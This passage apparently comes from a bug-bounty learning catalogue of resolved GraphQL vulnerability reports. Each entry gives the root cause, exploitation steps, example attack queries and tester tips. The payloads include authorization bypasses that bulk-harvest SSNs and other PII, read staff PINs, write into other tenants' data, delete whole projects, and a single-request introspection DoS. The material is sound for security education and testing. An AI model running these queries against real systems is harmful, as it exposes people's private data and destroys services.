+<h4>Root cause</h4><p style="margin:0">An authenticated GraphQL API allowed full introspection and enforced no per-object authorization, so any low-privilege user could query arbitrary users' records (SSN, clearance, evaluations, board membership) by DoDID/GUID.</p>
+<h4>Method</h4><ol><li>Authenticate as any low-privilege user and capture the /graphql POST in Burp</li><li>Run a full introspection query to recover the schema (types, queries by-id)</li><li>Identify by-identifier queries (userByDodId, evaluationsByDodId, findLdapPersonByDodId, candidatesForBoard, boardEventVoters)</li><li>Supply other users' identifiers (DoDIDs harvestable from an org address book / GUIDs from your own records) to read their data</li><li>Iterate to bulk-harvest PII across the org</li></ol>
+<div class="pre">POST /api/graphql HTTP/1.1
+Content-Type: application/json
+
+{"query":"query{findLdapPersonByDodId(dodId:\"VICTIM_DODID\"){givenName sn ssn rank mail branchOfService uic status}}"}
+
+# also: userByDodId, evaluationsByDodId, candidatesForBoard(boardGuid:...), boardEventVoters(boardEventGuid:...)</div>
+<p class="insight"><b>Insight —</b> On any GraphQL API: (1) always attempt introspection to map by-id queries; (2) authorization is frequently enforced at the endpoint but NOT per object - swap your own identifier for another user's to test BOLA. Identifiers often leak from adjacent systems (address books, your own record's relations).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2954320" target="_blank" rel="noopener">hackerone.com/reports/2954320</a></span><a class="src" href="#report-2954320" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2032716" style="--sv:var(--sev-high)" data-sev="3" data-votes="425" data-bounty="12500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mutation response echoes victim's private email pre-acceptance</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2032716</b> · security · 12500 · 425 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">SaveCollaboratorsMutation resolved a username to the underlying account and returned/echoed the private email in the collaboration flow before the invited user accepted.</p>
+<h4>Method</h4><ol><li>Create a dummy report, add target as collaborator by username</li><li>Re-open the collaborators editor and capture the GraphQL traffic</li><li>Read the victim's email surfaced in the mutation/response</li></ol>
+<div class="pre">POST /graphql
+{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":&lt;ID&gt;,"collaborators":[{"username_or_email":"&lt;VICTIM&gt;"}]}},...}</div>
+<p class="insight"><b>Insight —</b> Invite/collaborate flows that accept a username often resolve and return the private email tied to it. Test whether username-&gt;email resolution leaks in the mutation response.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2032716" target="_blank" rel="noopener">hackerone.com/reports/2032716</a></span><a class="src" href="#report-2032716" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-447930" style="--sv:var(--sev-high)" data-sev="3" data-votes="54" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Relay node interface exposes UUID-gated objects via auto-increment PK</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#447930</b> · security · none · 54 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Chain <b>node(id: PK) -&gt; leak secret UUID -&gt; UUID grants invite</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An object is meant to be addressed only by an unguessable UUID, but it still has a sequential primary key, and the GraphQL Relay node(id:) interface accepts the base64 gid://app/Type/&lt;PK&gt;, letting an attacker enumerate objects by PK and read back the secret UUID (and over-exposed related fields).</p>
+<h4>Method</h4><ol><li>Take a known node global ID and base64-decode it to gid://app/EmbeddedSubmissionForm/&lt;PK&gt;</li><li>Increment/decrement the PK, base64 re-encode</li><li>Query node(id:) selecting the UUID field to recover the secret UUID</li><li>Use the UUID (e.g. as embedded_submission_form_uuid) to query team{handle policy} and read private program info</li></ol>
+<div class="pre">query { node(id:"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") { ... on EmbeddedSubmissionForm { uuid team { handle policy } } } }</div>
+<p class="insight"><b>Insight —</b> A UUID is not access control if the object is also reachable by sequential PK through the Relay node interface. Decode every base64 gid, fuzz the numeric PK, and request the 'secret' fields (uuid, tokens) back. Two distinct bugs to report: node-interface object exposure AND the related object (Team) over-exposing fields.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/447930" target="_blank" rel="noopener">hackerone.com/reports/447930</a></span><a class="src" href="#report-447930" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-781150" style="--sv:var(--sev-high)" data-sev="3" data-votes="30" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL node() interface bypasses object-level authz on private-program objects</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#781150</b> · security · none · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The StructuredScope protector grants field access to any user holding the H1_PENTESTER role with the CAN_INVITE_HACKERS feature, but never verifies the user actually has a Pentest relationship to that scope; the generic Relay node(id:) interface then returns any StructuredScope by global id.</p>
+<h4>Method</h4><ol><li>Authenticate as an H1 pentester</li><li>Issue a GraphQL query against the node(id:) interface with a base64 StructuredScope global id</li><li>Cast the node to StructuredScope and select its fields</li><li>Receive scope data (asset_identifier, instruction, etc.) for private programs you were never invited to</li></ol>
+<div class="pre">query {
+  node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") {
+    ... on StructuredScope { _id asset_identifier asset_type }
+  }
+}</div>
+<p class="insight"><b>Insight —</b> The Relay node(id:) / global-id interface is a notorious authz bypass: object-level checks bound to specific query fields are skipped when the same object is fetched generically by id. Always re-test every protected object through node(id:).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/781150" target="_blank" rel="noopener">hackerone.com/reports/781150</a></span><a class="src" href="#report-781150" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1066203" style="--sv:var(--sev-high)" data-sev="3" data-votes="25" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cross-tenant GraphQL mutation (role checked, tenant not)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1066203</b> · stripe · awarded · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>stripe</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">UpdateAtlasApplicationPerson checked that the caller had Admin role on some Stripe account but not that the target Atlas application belonged to that account, letting an admin of one merchant add a co-founder to another merchant's Atlas application (cross-tenant write).</p>
+<h4>Method</h4><ol><li>Gain Admin on any Stripe account</li><li>Invoke the UpdateAtlasApplicationPerson mutation referencing another merchant's Atlas application id</li><li>Mutation succeeds - a person is written into the foreign tenant's application</li></ol>
+<div class="pre">mutation { UpdateAtlasApplicationPerson(applicationId: "&lt;VICTIM_TENANT_APP_ID&gt;", person: { role: cofounder, ... }) { ... } }</div>
+<p class="insight"><b>Insight —</b> Role checks (is-admin) are not tenant checks (is-admin-OF-THIS-object). On multi-tenant GraphQL, retest privileged mutations with an object id from a second tenant you also control to prove the missing tenant scoping.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1066203" target="_blank" rel="noopener">hackerone.com/reports/1066203</a></span><a class="src" href="#report-1066203" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-960244" style="--sv:var(--sev-high)" data-sev="3" data-votes="16" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL global-ID type confusion via untyped object_from_id</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#960244</b> · gitlab · awarded · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>graphql</b></span><span>Chain <b>type confusion in find_object -&gt; weak annotation-delete a</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The annotation mutations' find_object calls GitlabSchema.object_from_id(id) with no check that the resolved object is actually an Annotation. authorized_find! then runs the delete permission check against whatever object the attacker's GID points to; since a Developer may delete_metrics_dashboard_annotation, passing a Project GID deletes the whole project/repository.</p>
+<h4>Method</h4><ol><li>As a Developer (or any role that passes the annotation permission) on a target project</li><li>Send the deleteAnnotation mutation but supply a GID for a different object type, e.g. gid://Gitlab/Project/&lt;id&gt;</li><li>object_from_id returns the Project; the annotation-delete authz passes; DeleteService destroys the project + repository</li></ol>
+<div class="pre">mutation {
+  deleteAnnotation(input: {id: "gid://Gitlab/Project/&lt;project-id&gt;"}) {
+    clientMutationId
+  }
+}</div>
+<p class="insight"><b>Insight —</b> GraphQL global IDs are opaque but polymorphic: any resolver that does object_from_id / GlobalID.find without asserting the expected type lets you smuggle a different object into an authorization check meant for a weaker one. On every GraphQL mutation, try replacing the id argument with a GID of a higher-value type and see if the permission check (which may be lenient for the intended type) is applied to your substituted object.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/960244" target="_blank" rel="noopener">hackerone.com/reports/960244</a></span><a class="src" href="#report-960244" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-871749" style="--sv:var(--sev-med)" data-sev="2" data-votes="189" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Nested GraphQL node field leaks undisclosed-report metadata</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#871749</b> · security · awarded · 189 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The report_retests connection on the User GraphQL node lacked field-level authz, exposing asset_name, asset_type, severity_rating and weakness_name for reports that were never disclosed (report:null objects). A related flaw exposed Team.payment_transactions.total_count unauthenticated.</p>
+<h4>Method</h4><ol><li>Query a User/Team node and expand every nested connection (retests, transactions, etc.)</li><li>Look for objects where report:null but metadata fields are still populated</li><li>Correlate asset/severity/weakness to profile private programs' undisclosed activity</li></ol>
+<div class="pre">query { user(username:"X"){ report_retests { nodes { report{_id} asset_name asset_type severity_rating weakness_name report_substate } } } }</div>
+<p class="insight"><b>Insight —</b> Even when the parent object is authorized, its nested fields may not be. Expand every sub-connection on a GraphQL node and hunt for private metadata leaking through un-guarded child fields.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/871749" target="_blank" rel="noopener">hackerone.com/reports/871749</a></span><a class="src" href="#report-871749" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-978143" style="--sv:var(--sev-med)" data-sev="2" data-votes="146" data-bounty="2500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL node(id) global-ID lookup bypasses object-level authorization</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#978143</b> · security · USD 2500 · 146 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The generic node(id:) resolver fetches any object by its global relay ID without re-checking per-object authorization, returning fields (private_comment, respondent email/username) that the type's normal query path would gate.</p>
+<h4>Method</h4><ol><li>Obtain/guess a global node ID (gid://app/Type/NNN)</li><li>Query node(id:) unauthenticated and inline-fragment the target type</li><li>Select sensitive fields directly (private_comment, email, etc.)</li></ol>
+<div class="pre">{"query":"query { node(id: \"gid://hackerone/SurveyRatingItem/ID\") { ... on SurveyRatingItem { _id key private_comment survey_rating { respondent { username email } } } } }"}</div>
+<p class="insight"><b>Insight —</b> GraphQL's generic node()/relay interface is a classic BOLA sink - authz is often enforced on top-level queries but not on the node resolver. Always retry blocked objects through node(id:) with inline fragments.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/978143" target="_blank" rel="noopener">hackerone.com/reports/978143</a></span><a class="src" href="#report-978143" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-770209" style="--sv:var(--sev-med)" data-sev="2" data-votes="142" data-bounty="2500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unprotected Team GraphQL fields enumerate private programs</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#770209</b> · security · USD 2500 · 142 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Several Team object fields (report_sources, vpn_suspended, policy_markdown_html) are returned without authorization; their value differs between programs that run a private program and those that do not, letting an attacker enumerate hidden private programs.</p>
+<h4>Method</h4><ol><li>Query team(handle:) for the leaky fields on each candidate handle</li><li>report_sources non-empty (['HackerOne Platform']) =&gt; private program</li><li>vpn_suspended set / policy_markdown_html returns internal policy =&gt; private program exists</li></ol>
+<div class="pre">{"query":"query { team(handle:\"TARGET\"){ _id report_sources vpn_enabled vpn_suspended policy_markdown_html } }"}</div>
+<p class="insight"><b>Insight —</b> On GraphQL, authorization is per-field: some fields on an otherwise-public object leak internal state. Introspect every field of a shared type and diff responses across known-public vs suspected-private objects to find the leaking one.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/770209" target="_blank" rel="noopener">hackerone.com/reports/770209</a></span><a class="src" href="#report-770209" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1276992" style="--sv:var(--sev-med)" data-sev="2" data-votes="129" data-bounty="2500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL where-filter enumerates private objects (private program disclosure)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1276992</b> · security · 2500 · 129 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The teams GraphQL query honoured arbitrary boolean where-filters (roles is_private AND is_has_published_external_program) and returned handles/counts for private programs, letting an attacker enumerate otherwise-hidden objects by filtering.</p>
+<h4>Method</h4><ol><li>Send a teams query with a where clause filtering on private/internal attributes</li><li>Read the returned handles/total_count of private objects</li></ol>
+<div class="pre">{"query":"{teams(last:100,where:{_and:[{roles:is_has_published_external_program},{roles:is_private}]}){total_count,nodes{_id,handle,state}}}"}</div>
+<p class="insight"><b>Insight —</b> Rich GraphQL where/filter arguments are an enumeration oracle: filter on is_private/internal booleans to list objects you shouldn't see. Always test attribute-based filters on list queries.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1276992" target="_blank" rel="noopener">hackerone.com/reports/1276992</a></span><a class="src" href="#report-1276992" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-645299" style="--sv:var(--sev-med)" data-sev="2" data-votes="81" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Field-level authz bypass via GraphQL _or/_and filter</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#645299</b> · security · none · 81 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A 'secure schema' rewrites filterable fields (state -&gt; __new_filterable_state) to enforce field-level authz, but only the FIRST clause of an _or/_and array is rewritten; subsequent clauses query the unprotected schema, letting you infer a hidden field's value.</p>
+<h4>Method</h4><ol><li>Find a collection with a where filter on a field you cannot read</li><li>Wrap two identical equality conditions in _or</li><li>Server returns rows matching the guessed value (with the field itself null), confirming the value by inference</li></ol>
+<div class="pre">query {
+  teams(where:{_or:[{state:{_eq:soft_launched}},{state:{_eq:soft_launched}}]}) {
+    edges { node { id state } }
+  }
+}</div>
+<p class="insight"><b>Insight —</b> When an API applies field-level security, test boolean/list operators (_or, _and, _not, nested filters). Rewriting logic often only patches the first/top-level predicate. Inference-by-filter recovers a value you are forbidden to select directly.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/645299" target="_blank" rel="noopener">hackerone.com/reports/645299</a></span><a class="src" href="#report-645299" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-343464" style="--sv:var(--sev-med)" data-sev="2" data-votes="75" data-bounty="2500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL over-fetch of unprotected private fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#343464</b> · security · 2500 · 75 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Nested/scalar GraphQL fields that should be restricted (team_member_groups{name,permissions}; ibb_bounty_table) are resolvable by any caller because the resolver lacks a field-level authorization check.</p>
+<h4>Method</h4><ol><li>Introspect or guess sensitive fields hanging off an object you can query (Team by handle)</li><li>Select the private nested field directly in the query</li><li>Read internal RBAC/permission structure or private config that the UI never exposes</li></ol>
+<div class="pre">query { team(handle:"security"){ team_member_groups{ id name permissions } } }
+
+# variant (merged #2322082):
+query { team(handle:"security"){ ibb_bounty_table{ critical high medium low } } }</div>
+<p class="insight"><b>Insight —</b> GraphQL authz is per-resolver: an object being visible does not mean every field on it is guarded. Enumerate all selectable fields (introspection or wordlists) and request the sensitive-sounding ones directly - permissions, internal groups, budgets, private config.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/343464" target="_blank" rel="noopener">hackerone.com/reports/343464</a></span><a class="src" href="#report-343464" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3452015" style="--sv:var(--sev-med)" data-sev="2" data-votes="73" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL auth bypass by prepending __schema to private ops</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3452015</b> · enjin · awarded · 73 votes · resolved</div>
+<div class="taxo"><span>Program <b>enjin</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The GraphQL auth guard classifies a request as public/introspection when it contains __schema, so prepending __schema to a document lets private operations run without authentication (only ops that later dereference the user object error out).</p>
+<h4>Method</h4><ol><li>Take a private query/operation</li><li>Prepend an introspection selection (__schema) so the guard treats the request as introspection/public</li><li>Send unauthenticated -&gt; private queries execute</li></ol>
+<div class="pre">query { __schema { queryType { name } } privateOperation { ...sensitiveFields } }</div>
+<p class="insight"><b>Insight —</b> Test GraphQL auth middleware that special-cases introspection: mixing __schema with real operations can flip the whole request to 'public'. General lesson: per-request (not per-field) auth decisions based on document content are bypassable by adding an allowlisted field.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3452015" target="_blank" rel="noopener">hackerone.com/reports/3452015</a></span><a class="src" href="#report-3452015" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-717716" style="--sv:var(--sev-med)" data-sev="2" data-votes="65" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Over-broad object scope in GraphQL mutation + skip_authorization interactor</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#717716</b> · security · none · 65 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A mutation resolves the target object with schema.object_from_id and re-fetches it through a scope that returns everything the user can *see* rather than everything they can *manage*; the downstream interactor explicitly skip_authorization, so a visible-but-not-owned team can be mutated.</p>
+<h4>Method</h4><ol><li>Grab a team_id (base64 gid) for any program you can merely see</li><li>Send the UpdateGatewayProgramState mutation with that team_id and vpn_suspended true/false</li><li>For Gateway-enabled programs the VPN state is toggled; others 500 (still confirming the missing authz)</li></ol>
+<div class="pre">POST /graphql
+{"query":"mutation updateState($input_0:UpdateGatewayProgramStateInput!){updateGatewayProgramState(input:$input_0){team{handle}}}","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","vpn_suspended":false,"clientMutationId":"0"}}}</div>
+<p class="insight"><b>Insight —</b> For GraphQL mutations, check the scope used to reload the object: 'objects I can see' vs 'objects I can manage'. object_from_id + a see-scope + an interactor that skips authorization is a recurring IDOR pattern. A 500 on an unrelated ID vs 200 on a feature-enabled one is a strong side-channel signal.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/717716" target="_blank" rel="noopener">hackerone.com/reports/717716</a></span><a class="src" href="#report-717716" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-614355" style="--sv:var(--sev-med)" data-sev="2" data-votes="64" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL parallel-authz gap: namespace query returns REST-blocked private data</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#614355</b> · gitlab · awarded · 64 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GitLab's GraphQL namespace resolver enforces weaker authorization than the REST/Web API: private user profiles and secret group descriptions/metadata that REST returns 404 for are returned by GraphQL, even unauthenticated.</p>
+<h4>Method</h4><ol><li>Confirm a target is private via REST/Web (404 / not found)</li><li>Query the GraphQL namespace(fullPath: ...) resolver for the same handle</li><li>Read description, projects, visibility and other metadata GraphQL returns without a token</li></ol>
+<div class="pre">curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\"){description fullName fullPath id visibility projects(includeSubgroups:true){edges{node{id name visibility description}}}}}"}'</div>
+<p class="insight"><b>Insight —</b> A newer/second API surface (GraphQL) often reimplements object access without porting all the REST authorization checks. For any object hidden by REST/Web, re-request it through GraphQL (and vice versa) - the private-profile / secret-group protections were effectively void through GraphQL.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/614355" target="_blank" rel="noopener">hackerone.com/reports/614355</a></span><a class="src" href="#report-614355" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2357012" style="--sv:var(--sev-med)" data-sev="2" data-votes="59" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>UI-layer redaction bypass via GraphQL mutation echoing sensitive fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2357012</b> · security · awarded · 59 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Report redaction was applied at the presentation layer, but the ShareReportViaEmail GraphQL mutation's return selection (report{impact title vulnerability_information}) resolved the underlying unredacted fields in the response.</p>
+<h4>Method</h4><ol><li>Locate a mutation/query whose selection set can request the sensitive fields of an object you only see redacted</li><li>Issue the mutation requesting report{impact,title,vulnerability_information}</li><li>Read the sensitive values from the mutation response despite UI redaction</li></ol>
+<div class="pre">POST /graphql
+mutation ShareReportViaEmail($reportId: ID!,$message:String!,$emails:[String!]!){
+  shareReportViaEmail(input:{report_id:$reportId,message:$message,emails:$emails}){
+    report{impact title vulnerability_information}
+  }
+}
+variables: {reportId:"gid://hackerone/Report/&lt;id&gt;",message:"x",emails:["you@wearehackerone.com"]}</div>
+<p class="insight"><b>Insight —</b> Redaction/obfuscation done in the UI is not enforcement. On GraphQL, request the raw fields of a partially-visible object through any mutation/query that returns that object; resolvers frequently return unredacted data.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2357012" target="_blank" rel="noopener">hackerone.com/reports/2357012</a></span><a class="src" href="#report-2357012" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2048725" style="--sv:var(--sev-med)" data-sev="2" data-votes="56" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Recursive introspection DoS (no depth limit)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2048725</b> · sorare · awarded · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>sorare</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GraphQL introspection was public with no query-depth/complexity limit; a circular query walking __schema.types-&gt;fields-&gt;type-&gt;fields repeatedly forces massive schema serialization, degrading the server on a single unauthenticated request.</p>
+<h4>Method</h4><ol><li>Confirm introspection is enabled (public playground)</li><li>Craft a circular __schema query nesting types{fields{type{fields{...}}}}</li><li>Add more recursion loops to increase response size/latency</li><li>Single request returns megabytes and multi-second delay on both GraphQL instances</li></ol>
+<div class="pre">POST /graphql
+Content-Type: application/json
+
+{"query":"query { __schema { types { fields { type { fields { type { fields { type { fields { name }}}}}}}}}"}</div>
+<p class="insight"><b>Insight —</b> On any GraphQL endpoint with introspection on, test recursive/circular field expansion for a single-request DoS. No auth or botnet needed; each added loop multiplies cost. Recommend depth+complexity limits.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2048725" target="_blank" rel="noopener">hackerone.com/reports/2048725</a></span><a class="src" href="#report-2048725" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1091303" style="--sv:var(--sev-med)" data-sev="2" data-votes="46" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL over-fetch of PIN field + token-scope escalation (Shopify POS)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1091303</b> · shopify · awarded · 46 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>graphql</b></span><span>Chain <b>low-priv user -&gt; xauth access_token -&gt; GraphQL StaffMe</b></span><span>Tag <b>graphql</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A low-privilege user can obtain a broadly-scoped POS access_token from /admin/api/xauth, then query the GraphQL StaffMember object which exposes the sensitive 'pin' field for all staff, letting them read a Manager PIN and escalate on the physical POS.</p>
+<h4>Method</h4><ol><li>Create a low-priv shop+POS user and strip its admin permissions</li><li>Grab the POS api_key from /admin/apps/pos</li><li>POST credentials to /admin/api/xauth to receive an access_token</li><li>Send that token as X-Shopify-Access-Token to the unversioned GraphQL endpoint and query staffMembers { ... pin ... }</li><li>Read the Manager PIN and use it on the POS device to escalate</li></ol>
+<div class="pre">POST /admin/api/xauth
+{"api_key":"...","login":"lowpriv@ex.com","password":"..."}
+# -&gt; access_token
+POST /admin/api/unversioned/graphql
+X-Shopify-Access-Token: &lt;token&gt;
+{"query":"query{ shop{ staffMembers(first:100){ edges{ node{ name pin isShopOwner } } } } }"}</div>
+<p class="insight"><b>Insight —</b> On GraphQL, enumerate every field of user/staff objects (pin, secret, phone, privateData) - authz is often per-object, not per-field. Also test whether a low-priv login mints a token whose scope exceeds the user's UI permissions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1091303" target="_blank" rel="noopener">hackerone.com/reports/1091303</a></span><a class="src" href="#report-1091303" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-800231" style="--sv:var(--sev-med)" data-sev="2" data-votes="42" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL global-id -&gt; ActiveResource param injection (internal REST) via URL-encoding</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#800231</b> · security · none · 42 votes · resolved</div>
